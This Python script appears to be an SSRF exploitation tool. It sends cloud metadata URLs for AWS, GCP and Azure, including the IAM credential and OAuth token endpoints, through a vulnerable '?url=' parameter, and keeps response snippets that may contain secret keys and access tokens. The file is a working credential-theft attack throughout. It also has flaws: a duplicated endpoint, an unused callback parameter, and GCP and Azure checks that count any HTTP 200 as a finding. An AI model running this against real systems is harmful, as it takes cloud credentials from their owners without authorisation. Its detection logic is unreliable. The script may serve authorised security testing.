#!/usr/bin/env python3
"""Cloud Metadata Tester

Tests for cloud metadata endpoint access via SSRF.
Supports AWS, GCP, and Azure metadata endpoints.
"""

import requests
from typing import Dict, Any, List, Optional


def test_aws_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test AWS metadata endpoint access
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "aws_metadata",
        "vulnerable": False,
        "evidence": None
    }
    
    metadata_endpoints = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
    ]
    
    for endpoint in metadata_endpoints:
        try:
            # Inject metadata endpoint into SSRF
            test_url = f"{ssrf_url}?url={endpoint}"
            resp = requests.get(test_url, timeout=10)
            
            # Check for AWS metadata indicators
            content = resp.text.lower()
            aws_indicators = [
                "ami-id",
                "instance-id",
                "instance-type",
                "availability-zone",
                "security-credentials",
                "accesskeyid",
                "secretaccesskey"
            ]
            
            if any(ind in content for ind in aws_indicators):
                result["vulnerable"] = True
                result["evidence"] = {
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "indicators_found": [ind for ind in aws_indicators if ind in content]
                }
                break
        except Exception:
            continue
    
    return result


def test_gcp_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test GCP metadata endpoint access
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "gcp_metadata",
        "vulnerable": False,
        "evidence": None
    }
    
    metadata_endpoints = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
    ]
    
    for endpoint in metadata_endpoints:
        try:
            test_url = f"{ssrf_url}?url={endpoint}"
            resp = requests.get(
                test_url,
                headers={"Metadata-Flavor": "Google"},
                timeout=10
            )
            
            content = resp.text.lower()
            gcp_indicators = [
                "compute",
                "project-id",
                "instance-id",
                "service-account",
                "access-token"
            ]
            
            if any(ind in content for ind in gcp_indicators) or resp.status_code == 200:
                result["vulnerable"] = True
                result["evidence"] = {
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500]
                }
                break
        except Exception:
            continue
    
    return result


def test_azure_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test Azure metadata endpoint access
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "azure_metadata",
        "vulnerable": False,
        "evidence": None
    }
    
    metadata_endpoints = [
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/instance/compute",
        "http://169.254.169.254/metadata/identity/oauth2/token",
    ]
    
    for endpoint in metadata_endpoints:
        try:
            test_url = f"{ssrf_url}?url={endpoint}"
            resp = requests.get(
                test_url,
                headers={"Metadata": "true"},
                timeout=10
            )
            
            content = resp.text.lower()
            azure_indicators = [
                "subscription",
                "resourcegroup",
                "vmname",
                "access_token",
                "azure"
            ]
            
            if any(ind in content for ind in azure_indicators) or resp.status_code == 200:
                result["vulnerable"] = True
                result["evidence"] = {
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500]
                }
                break
        except Exception:
            continue
    
    return result


def test_cloud_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test all cloud metadata endpoints
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results for all cloud providers
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Test AWS
    aws_result = test_aws_metadata(ssrf_url, callback_url)
    results["tests_run"] += 1
    if aws_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(aws_result)
    
    # Test GCP
    gcp_result = test_gcp_metadata(ssrf_url, callback_url)
    results["tests_run"] += 1
    if gcp_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(gcp_result)
    
    # Test Azure
    azure_result = test_azure_metadata(ssrf_url, callback_url)
    results["tests_run"] += 1
    if azure_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(azure_result)
    
    return results

